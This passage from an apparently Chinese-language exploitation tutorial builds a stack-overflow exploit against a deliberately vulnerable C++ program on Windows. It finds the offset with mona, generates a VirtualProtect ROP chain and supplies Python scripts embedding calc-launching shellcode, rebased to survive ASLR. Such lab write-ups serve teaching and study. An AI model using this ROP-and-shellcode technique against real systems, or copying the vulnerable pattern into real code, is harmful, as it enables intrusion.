class="built_in">fseek</span>(f, <span class="number">0L</span>, SEEK_END);</span><br><span class="line">        <span class="type">long</span> bytes = <span class="built_in">ftell</span>(f);</span><br><span class="line">        <span class="built_in">fseek</span>(f, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">        <span class="built_in">fread</span>(name, <span class="number">1</span>, bytes, f);</span><br><span class="line">        <span class="built_in">fclose</span>(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printNameInHex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(name) / <span class="number">4</span>; ++i)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; 0x%08x&quot;</span>, ptr[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">old_main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Name name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!name.<span class="built_in">readFromFile</span>(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        name.<span class="built_in">printName</span>();</span><br><span class="line">        name.<span class="built_in">printNameInHex</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Do you want to read the name again? [y/n] &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (_getch() != <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>, off)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> moreStack[<span class="number">4096</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4096</span>; i++) &#123;</span><br><span class="line">        moreStack[i] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">old_main</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>name对象在栈中存储，其内存布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VTptr : 虚表指针</span><br><span class="line">name[0..3]</span><br><span class="line">...</span><br><span class="line">name[28..31]</span><br><span class="line">ptr</span><br></pre></td></tr></table></figure>

<h3 id="调试收集信息"><a href="#调试收集信息" class="headerlink" title="调试收集信息"></a>调试收集信息</h3><p>预期执行流</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ret_eip -&gt; ropchain -&gt; shellcode</span><br></pre></td></tr></table></figure>

<p>查看各模块基址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | ModuleName</span><br><span class="line">0x75c00000 | 0x75cf0000 | 0x000f0000 | True   | False   | True  | True  |  True    | True   | [KERNEL32.DLL]</span><br><span class="line">0x77450000 | 0x775f4000 | 0x001a4000 | True   | False   | True  | True  |  True    | True   | [ntdll.dll]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!py mona pc 1000</span><br></pre></td></tr></table></figure>

<p>在此之前，我们需要给 ptr 指定一个可读地址（比如kernel32的基址），不然当程序运行到 ptr[i] 时，就会报错退出，执行不到 ret eip。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    kernel32 = <span class="number">0x75c00000</span></span><br><span class="line">    pattern = <span class="string">b&quot;...&quot;</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x75c00000</span>) + pattern</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; !py mona po 61413161</span><br><span class="line"></span><br><span class="line">** You are running pykd.pyd v0.3.4.15. Use at your own risk **</span><br><span class="line"></span><br><span class="line">Hold on...</span><br><span class="line">[+] Command used:</span><br><span class="line">!py D:\Program Files (x86)\Windbg\x86\mona.py po 61413161</span><br><span class="line">Looking for a1Aa in pattern of 500000 bytes</span><br><span class="line"> - Pattern a1Aa (0x61413161) found in cyclic pattern at position 4</span><br></pre></td></tr></table></figure>

<p>得到偏移量为 8 </p>
<h3 id="构建RopChain"><a href="#构建RopChain" class="headerlink" title="构建RopChain"></a>构建RopChain</h3><p>windbg，太慢啦，生成不出来结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!py mona config -set workingfolder D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme4\mona-log</span><br><span class="line">!py mona rop -m &quot;kernel32, ntdll&quot; -cp nonnull</span><br></pre></td></tr></table></figure>

<p>immunity debugger，运行成功，虽然运行过程中会卡死</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!mona config -set workingfolder D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme4\mona-log-imm</span><br><span class="line">!mona rop -m &quot;kernel32,ntdll&quot; -cp nonnull // 注意不要在模块名间加空格</span><br></pre></td></tr></table></figure>

<p>打开<code>rop_chains.txt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">kernel32 = <span class="number">0x75c00000</span></span><br><span class="line">ntdll = <span class="number">0x77450000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>():</span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x75c4770d</span>,  <span class="comment"># POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x75c81390</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="number">0x77493c9e</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x75c6d43c</span>,  <span class="comment"># PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x774afe38</span>,  <span class="comment"># POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x7746b318</span>,  <span class="comment"># &amp; push esp # ret  [ntdll.dll] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x774ceeb8</span>,  <span class="comment"># POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x00000201</span>,  <span class="comment"># 0x00000201-&gt; ebx</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x774cb229</span>,  <span class="comment"># POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x00000040</span>,  <span class="comment"># 0x00000040-&gt; edx</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x774d8a1f</span>,  <span class="comment"># POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x77573a1d</span>,  <span class="comment"># &amp;Writable location [ntdll.dll] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x774c9d25</span>,  <span class="comment"># POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x75c49bea</span>,  <span class="comment"># RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x75c1ea52</span>,  <span class="comment"># POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x75c36095</span>,  <span class="comment"># PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    rop_chain = create_rop_chain()</span><br><span class="line">    readable_ptr = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, kernel32)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, kernel32) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>  + rop_chain + shellcode</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>

<p>对应的exp为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">kernel32 = <span class="number">0x75c00000</span></span><br><span class="line">ntdll = <span class="number">0x77450000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>():</span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x75c4770d</span>,  <span class="comment"># POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x75c81390</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="number">0x77493c9e</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x75c6d43c</span>,  <span class="comment"># PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x774afe38</span>,  <span class="comment"># POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x7746b318</span>,  <span class="comment"># &amp; push esp # ret  [ntdll.dll] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x774ceeb8</span>,  <span class="comment"># POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x00000201</span>,  <span class="comment"># 0x00000201-&gt; ebx</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x774cb229</span>,  <span class="comment"># POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x00000040</span>,  <span class="comment"># 0x00000040-&gt; edx</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x774d8a1f</span>,  <span class="comment"># POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x77573a1d</span>,  <span class="comment"># &amp;Writable location [ntdll.dll] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x774c9d25</span>,  <span class="comment"># POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x75c49bea</span>,  <span class="comment"># RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x75c1ea52</span>,  <span class="comment"># POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x75c36095</span>,  <span class="comment"># PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    rop_chain = create_rop_chain()</span><br><span class="line">    readable_ptr = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, kernel32)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, kernel32) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>  + rop_chain + shellcode</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>

<p>执行后运行程序，成功弹出计算器。</p>
<p>重启操作系统后，无法再弹出计算器。</p>
<h3 id="完善exp"><a href="#完善exp" class="headerlink" title="完善exp"></a>完善exp</h3><blockquote>
<p>ret_eip -&gt; ropchain -&gt; shellcode</p>
</blockquote>
<p>将上述绝对地址，替换为各自的【模块基址】+【偏移量】，并通过一定方式（比如手动）更新模块基址，就能够让exp保持有效</p>
<p>其中模块基址为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kernel32.dll:	0x75c00000</span><br><span class="line">ntdll.dll	: 	0x77450000</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">kernel32 = <span class="number">0x75c00000</span></span><br><span class="line">ntdll = <span class="number">0x77450000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>():</span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      kernel32 + <span class="number">0x0004770d</span>,  <span class="comment"># POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      kernel32 + <span class="number">0x00081390</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR</span></span><br><span class="line">      ntdll + <span class="number">0x00043c9e</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      kernel32 + <span class="number">0x0006d43c</span>,  <span class="comment"># PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      ntdll + <span class="number">0x0005fe38</span>,  <span class="comment"># POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      ntdll + <span class="number">0x0001b318</span>,  <span class="comment"># &amp; push esp # ret  [ntdll.dll] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      ntdll + <span class="number">0x0007eeb8</span>,  <span class="comment"># POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x00000201</span>,  <span class="comment"># 0x00000201-&gt; ebx</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      ntdll + <span class="number">0x0007b229</span>,  <span class="comment"># POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x00000040</span>,  <span class="comment"># 0x00000040-&gt; edx</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      ntdll + <span class="number">0x00088a1f</span>,  <span class="comment"># POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      ntdll + <span class="number">0x00123a1d</span>,  <span class="comment"># &amp;Writable location [ntdll.dll] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      ntdll + <span class="number">0x00079d25</span>,  <span class="comment"># POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      kernel32 + <span class="number">0x00049bea</span>,  <span class="comment"># RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      kernel32 + <span class="number">0x0001ea52</span>,  <span class="comment"># POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      kernel32 + <span class="number">0x00036095</span>,  <span class="comment"># PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span 